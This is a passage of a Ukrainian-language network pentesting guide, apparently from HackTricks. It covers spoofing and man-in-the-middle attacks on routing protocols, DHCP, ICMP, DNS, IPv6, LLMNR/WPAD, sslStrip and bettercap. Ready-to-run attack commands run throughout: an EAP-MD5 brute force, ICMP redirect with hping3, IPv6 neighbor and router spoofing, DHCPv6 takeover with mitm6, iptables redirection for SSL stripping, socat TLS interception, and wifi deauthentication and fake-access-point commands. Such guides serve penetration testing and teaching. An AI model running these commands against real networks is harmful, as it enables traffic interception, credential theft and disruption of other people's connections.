Якщо атакуючий знаходиться між жертвою та сервером аутентифікації, він може спробувати знизити (якщо це необхідно) протокол аутентифікації до EAP-MD5 та захопити спробу аутентифікації. Потім він може брутфорсити це, використовуючи:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) - це клас мережевих протоколів, призначених для **створення гарячої резервної маршрутизаційної системи**. З FHRP фізичні маршрутизатори можуть бути об'єднані в один логічний пристрій, що підвищує відмовостійкість і допомагає розподілити навантаження.

**Інженери Cisco Systems розробили два протоколи FHRP: GLBP та HSRP.**

{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Відомо про існування трьох версій Протоколу маршрутизаційної інформації (RIP): RIP, RIPv2 та RIPng. Датаграми надсилаються до пір через порт 520 за допомогою UDP в RIP та RIPv2, тоді як датаграми транслюються на UDP порт 521 через IPv6 multicast в RIPng. Підтримка аутентифікації MD5 була введена в RIPv2. З іншого боку, нативна аутентифікація не включена в RIPng; натомість покладаються на необов'язкові заголовки IPsec AH та ESP в IPv6.

- **RIP та RIPv2:** Спілкування відбувається через UDP датаграми на порту 520.
- **RIPng:** Використовує UDP порт 521 для трансляції датаграм через IPv6 multicast.

Зверніть увагу, що RIPv2 підтримує аутентифікацію MD5, тоді як RIPng не включає нативну аутентифікацію, покладаючись на заголовки IPsec AH та ESP в IPv6.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** - це динамічний протокол маршрутизації. **Це протокол вектору відстані.** Якщо **немає аутентифікації** та налаштування пасивних інтерфейсів, **зловмисник** може втручатися в маршрутизацію EIGRP і викликати **отруєння таблиць маршрутизації**. Більше того, мережа EIGRP (іншими словами, автономна система) **є плоскою і не має сегментації на зони**. Якщо **зловмисник інжектує маршрут**, ймовірно, що цей маршрут **пошириться** по всій автономній системі EIGRP.

Для атаки на систему EIGRP потрібно **встановити сусідство з легітимним маршрутизатором EIGRP**, що відкриває багато можливостей, від базового розвідки до різних ін'єкцій.

[**FRRouting**](https://frrouting.org/) дозволяє реалізувати **віртуальний маршрутизатор, який підтримує BGP, OSPF, EIGRP, RIP та інші протоколи.** Все, що вам потрібно зробити, це розгорнути його на системі вашого атакуючого, і ви насправді можете вдавати, що ви легітимний маршрутизатор в домені маршрутизації.

{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) має можливості для перехоплення трансляцій EIGRP (Enhanced Interior Gateway Routing Protocol). Він також дозволяє інжектувати пакети, які можуть бути використані для зміни конфігурацій маршрутизації.

### OSPF

У протоколі Open Shortest Path First (OSPF) **зазвичай використовується аутентифікація MD5 для забезпечення безпечного спілкування між маршрутизаторами**. Однак цей захід безпеки може бути скомпрометований за допомогою інструментів, таких як Loki та John the Ripper. Ці інструменти здатні захоплювати та ламати MD5 хеші, відкриваючи ключ аутентифікації. Після отримання цього ключа його можна використовувати для введення нової інформації про маршрути. Для налаштування параметрів маршруту та встановлення скомпрометованого ключа використовуються вкладки _Injection_ та _Connection_ відповідно.

- **Захоплення та ламання MD5 хешів:** Для цього використовуються інструменти, такі як Loki та John the Ripper.
- **Налаштування параметрів маршруту:** Це робиться через вкладку _Injection_.
- **Встановлення скомпрометованого ключа:** Ключ налаштовується в вкладці _Connection_.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Інструмент для сканування мережевого трафіку та виявлення вразливостей
- Ви можете знайти деяку **додаткову інформацію про мережеві атаки** [**тут**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

Зловмисник налаштовує всі мережеві параметри (GW, IP, DNS) нового члена мережі, надсилаючи підроблені DHCP відповіді.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Перевірте [попередній розділ](#arp-spoofing).

### ICMPRedirect

ICMP Redirect полягає у відправці ICMP пакету типу 1 код 5, який вказує, що атакуючий є найкращим способом досягти IP. Тоді, коли жертва хоче зв'язатися з IP, вона відправить пакет через атакуючого.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

Зловмисник вирішить деякі (або всі) домени, які запитує жертва.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Налаштуйте власний DNS за допомогою dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Локальні шлюзи

Часто існує кілька маршрутів до систем і мереж. Після складання списку MAC-адрес у локальній мережі використовуйте _gateway-finder.py_ для ідентифікації хостів, які підтримують IPv4 пересилання.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Для локального розв'язання хостів, коли запити DNS не вдаються, системи Microsoft покладаються на **Link-Local Multicast Name Resolution (LLMNR)** та **NetBIOS Name Service (NBT-NS)**. Аналогічно, **Apple Bonjour** та **Linux zero-configuration** реалізації використовують **Multicast DNS (mDNS)** для виявлення систем у мережі. Через неавтентифіковану природу цих протоколів та їх роботу через UDP, транслюючи повідомлення, їх можна експлуатувати зловмисниками, які прагнуть перенаправити користувачів на шкідливі сервіси.

Ви можете видавати себе за сервіси, які шукають хости, використовуючи Responder для відправки фальшивих відповідей.\
Читати тут більше інформації про [як видавати себе за сервіси з Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Браузери зазвичай використовують **протокол Web Proxy Auto-Discovery (WPAD) для автоматичного отримання налаштувань проксі**. Це передбачає отримання конфігураційних деталей з сервера, зокрема через URL, такий як "http://wpad.example.org/wpad.dat". Виявлення цього сервера клієнтами може відбуватися через різні механізми:

- Через **DHCP**, де виявлення полегшується за допомогою спеціального коду 252.
- Через **DNS**, що передбачає пошук імені хоста з позначкою _wpad_ у локальному домені.
- Через **Microsoft LLMNR та NBT-NS**, які є механізмами резервного копіювання, що використовуються у випадках, коли запити DNS не вдаються.

Інструмент Responder використовує цей протокол, діючи як **шкідливий WPAD сервер**. Він використовує DHCP, DNS, LLMNR та NBT-NS, щоб ввести клієнтів в оману, змушуючи їх підключатися до нього. Щоб дізнатися більше про те, як можна видавати себе за сервіси, використовуючи Responder, [перевірте це](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Ви можете пропонувати різні сервіси в мережі, щоб спробувати **обманути користувача** ввести деякі **текстові облікові дані**. **Більше інформації про цю атаку в** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Ця атака дуже схожа на ARP Spoofing, але у світі IPv6. Ви можете змусити жертву думати, що IPv6 GW має MAC-адресу зловмисника.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Деякі ОС за замовчуванням налаштовують шлюз з RA пакетів, надісланих у мережі. Щоб оголосити зловмисника маршрутизатором IPv6, ви можете використовувати:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP спуфінг

За замовчуванням деякі ОС намагаються налаштувати DNS, читаючи пакет DHCPv6 в мережі. Тоді зловмисник може надіслати пакет DHCPv6, щоб налаштувати себе як DNS. DHCP також надає IPv6 жертві.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (фейкова сторінка та ін'єкція JS коду)

## Інтернет-атаки

### sslStrip

В основному, що робить ця атака, це в разі, якщо **користувач** намагається **доступитися** до **HTTP** сторінки, яка **перенаправляє** на **HTTPS** версію. **sslStrip** буде **підтримувати** **HTTP з'єднання з** **клієнтом** та **HTTPS з'єднання з** **сервером**, щоб мати можливість **перехоплювати** з'єднання у **вільному тексті**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Більше інформації [тут](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ та dns2proxy для обходу HSTS

**Різниця** між **sslStrip+ та dns2proxy** і **sslStrip** полягає в тому, що вони **перенаправлятимуть**, наприклад, _**www.facebook.com**_ **на** _**wwww.facebook.com**_ (зверніть увагу на **додаткову** "**w**") і встановлять **адресу цього домену як IP-адресу атакуючого**. Таким чином, **клієнт** буде **підключатися** до _**wwww.facebook.com**_ **(атакуючого)**, але за лаштунками **sslstrip+** буде **підтримувати** **реальне з'єднання** через https з **www.facebook.com**.

**Мета** цієї техніки полягає в тому, щоб **уникнути HSTS**, оскільки _**wwww**.facebook.com_ **не буде** збережено в **кеші** браузера, тому браузер буде обмануто, щоб виконати **автентифікацію facebook через HTTP**.\
Зверніть увагу, що для виконання цієї атаки жертва повинна спочатку спробувати отримати доступ до [http://www.faceook.com](http://www.faceook.com), а не https. Це можна зробити, модифікуючи посилання всередині http-сторінки.

Більше інформації [тут](https://www.bettercap.org/legacy/#hsts-bypass), [тут](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) та [тут](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip або sslStrip+ більше не працюють. Це пов'язано з тим, що в браузерах збережені правила HSTS, тому навіть якщо це перший раз, коли користувач отримує доступ до "важливого" домену, він отримає доступ через HTTPS. Також зверніть увагу, що збережені правила та інші згенеровані правила можуть використовувати прапорець** [**`includeSubdomains`**](https://hstspreload.appspot.com) **тому приклад** _**wwww.facebook.com**_ **з попереднього разу більше не працюватиме, оскільки** _**facebook.com**_ **використовує HSTS з `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP прослуховування на порту
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL прослуховування на порту

#### Генерація ключів та самопідписаного сертифіката
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Слухати за допомогою сертифіката
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Слухайте, використовуючи сертифікат, і перенаправляйте на хости
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Іноді, якщо клієнт перевіряє, що CA є дійсним, ви можете **представити сертифікат іншого імені хоста, підписаний CA**.\
Ще один цікавий тест - це **представити сертифікат запитуваного імені хоста, але самопідписаний**.

Інші речі для тестування - це спробувати підписати сертифікат дійсним сертифікатом, який не є дійсним CA. Або використовувати дійсний відкритий ключ, примусити використовувати алгоритм, як-от diffie hellman (той, що не потребує розшифровки нічого з реальним приватним ключем) і коли клієнт запитує пробу реального приватного ключа (як хеш), надіслати фальшиву пробу і сподіватися, що клієнт не перевірить це.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Примітки щодо активного виявлення

Зверніть увагу, що коли UDP-пакет надсилається на пристрій, який не має запитуваного порту, надсилається ICMP (Port Unreachable).

### **ARP виявлення**

Пакети ARP використовуються для виявлення, які IP-адреси використовуються в мережі. ПК повинен надіслати запит для кожної можливої IP-адреси, і лише ті, що використовуються, відповідають.

### **mDNS (мультимедійний DNS)**

Bettercap надсилає запит MDNS (кожні X мс), запитуючи **\_services\_.dns-sd.\_udp.local**. Машина, яка бачить цей пакет, зазвичай відповідає на цей запит. Потім вона лише шукає машини, які відповідають на "services".

**Інструменти**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap транслює пакети на порт 137/UDP, запитуючи ім'я "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Протокол простого виявлення сервісів)**

Bettercap транслює пакети SSDP, шукаючи всі види сервісів (UDP Port 1900).

### **WSD (Веб-сервіс виявлення)**

Bettercap транслює пакети WSD, шукаючи сервіси (UDP Port 3702).

## Посилання

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Оцінка безпеки мережі: Знайте свою мережу (3-е видання)**
- **Практичний IoT Хакінг: Останній посібник з атак на Інтернет речей. Автори: Фотіс Ханцис, Іоанніс Стайс, Пауліно Кальдерон, Євангелос Дейрментзоглу, Боу Вуд**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
